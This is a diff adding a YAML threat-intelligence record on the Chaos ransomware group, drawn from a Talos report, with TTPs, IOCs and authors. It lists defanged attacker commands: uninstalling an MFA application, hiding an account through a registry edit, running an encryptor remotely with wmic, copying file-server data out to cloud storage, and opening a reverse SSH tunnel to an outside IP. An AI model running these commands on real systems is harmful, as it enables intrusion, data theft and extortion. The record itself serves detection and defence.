@@ -1,0 +1,82 @@
+description: Cisco Talos Incident Response (Talos IR) observed attacks by Chaos, a
+  relatively new ransomware-as-a-service (RaaS) group conducting big-game hunting
+  and double extortion attacks. The ransomware utilizes multi-threaded rapid selective
+  encryption, anti-analysis techniques, and targets both local and network resources.
+attribution:
+- Chaos RaaS
+malware_families:
+- Chaos Ransomware
+TTPs:
+  processes:
+  - powershell.exe
+  - cmd.exe
+  - wmic product where name=$MFA_application for Windows Logon x64 call uninstall
+    /nointeractive
+  - mstsc.exe
+  - C:\\Users\\$filename[.]exe
+  - Encryptor[.]exe
+  commandline:
+  - powershell.exe -noexit -command Set-Location -literalPath 'C:\Users\$user\Desktop'
+  - PowerShell.exe -Nologo -Noninteractive - NoProfile -ExecutionPolicy Bypass; Get-DeliveryOptimizationStatus
+    | where-object {($.Sourceurl -CLike 'hxxp[://]localhost[:]8005*') -AND (($.FileSize
+    -ge '52428800') -or ($.BytesFromPeers -ne '0') -or (($.BytesFromCacheServer -ne
+    '0') -and ($_.BytesFromCacheServer -ne $null)))} | select-object -Property BytesFromHttp,
+    FileId, BytesFromPeers,Status,BytesFromCacheServer,SourceURL | ConvertTo-Xml -as
+    string - NoTypeInformation
+  - cmd.exe /c reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist
+    /v $user_account /t REG_DWORD /d 0 /f
+  - net[.]exe user $user_name $password /domCredential access and privilege escalation
+  - cmd.EXE /c wmic product where name=$MFA_application for Windows Logon x64 call
+    uninstall /nointeractive
+  - mstsc.exe /v:$remote machine hostname
+  - wmic /node:$host process call create C:\Users\encryptor[.]exe /lkey:"$32-bytekey"
+    /encrypt_step:40 /work_mode:local_network
+  - Wininit[.]exe copy --max-age 1y --exclude *{psd,7z, mox,pst,FIT, FIL,MOV,mdb,iso,exe,dll,wav,png,db,log,HEIC,dwg,tmp,vhdx,msi}
+    [\\\\]FS01[\\]data cloud1:basket123/data -q --ignore-existing --auto-confirm --multi-thread-streams
+    25 --transfers 15 --b2-disable-checksum -P
+  - C:\\WINDOWS\\System32\\OpenSSH\\ssh[.]exe -R :12840 -N userconnectnopass@45[.]61[.]134[.]36
+    -p 443 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+  - C:\\Users\\$filename[.]exe /lkey:\"32-byte key\" /encrypt_step:40 /work_mode:local_network
+  - Encryptor[.]exe /lkey:\"32-byte key\" /encrypt_step:$0-100 /work_mode:$mode /ignorar_arquivos_grandes
+  powershell:
+  - powershell.exe -noexit -command Set-Location -literalPath 'C:\Users\$user\Desktop'
+  - PowerShell.exe -Nologo -Noninteractive - NoProfile -ExecutionPolicy Bypass; Get-DeliveryOptimizationStatus
+    | where-object {($.Sourceurl -CLike 'hxxp[://]localhost[:]8005*') -AND (($.FileSize
+    -ge '52428800') -or ($.BytesFromPeers -ne '0') -or (($.BytesFromCacheServer -ne
+    '0') -and ($_.BytesFromCacheServer -ne $null)))} | select-object -Property BytesFromHttp,
+    FileId, BytesFromPeers,Status,BytesFromCacheServer,SourceURL | ConvertTo-Xml -as
+    string - NoTypeInformation
+  scripting_engine:
+  - cmd.exe /c reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist
+    /v $user_account /t REG_DWORD /d 0 /f
+  - C:\\WINDOWS\\System32\\OpenSSH\\ssh[.]exe -R :12840 -N userconnectnopass@45[.]61[.]134[.]36
+    -p 443 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+  - Encryptor[.]exe /lkey:\"32-byte key\" /encrypt_step:$0-100 /work_mode:$mode /ignorar_arquivos_grandes
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist
+  image_load: []
+  network_connections:
+  - mstsc.exe /v:$remote machine hostname
+  - C:\\WINDOWS\\System32\\OpenSSH\\ssh[.]exe -R :12840 -N userconnectnopass@45[.]61[.]134[.]36
+    -p 443 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+  - C:\\Users\\$filename[.]exe /lkey:\"32-byte key\" /encrypt_step:40 /work_mode:local_network
+  file_activity:
+  - Wininit[.]exe copy --max-age 1y --exclude *{psd,7z, mox,pst,FIT, FIL,MOV,mdb,iso,exe,dll,wav,png,db,log,HEIC,dwg,tmp,vhdx,msi}
+    [\\]FS01[\]data cloud1:basket123/data -q --ignore-existing --auto-confirm --multi-thread-streams
+    25 --transfers 15 --b2-disable-checksum -P
+  - C:\\Users\\$filename[.]exe /lkey:\"32-byte key\" /encrypt_step:40 /work_mode:local_network
+  persistence:
+  - cmd.exe /c reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist
+    /v $user_account /t REG_DWORD /d 0 /f
+  pipes: []
+  process_relations: []
+IOCs:
+- 45.61.134[.]36
+- win88@thesecure[.]biz
+authors:
+- Anna Bennett
+- James Nutland
+- Chetan Raghuprasad
+reference: https://blog.talosintelligence.com/new-chaos-ransomware/
+date_of_publication: July 24, 2025
+file_creation_date: July 30, 2025
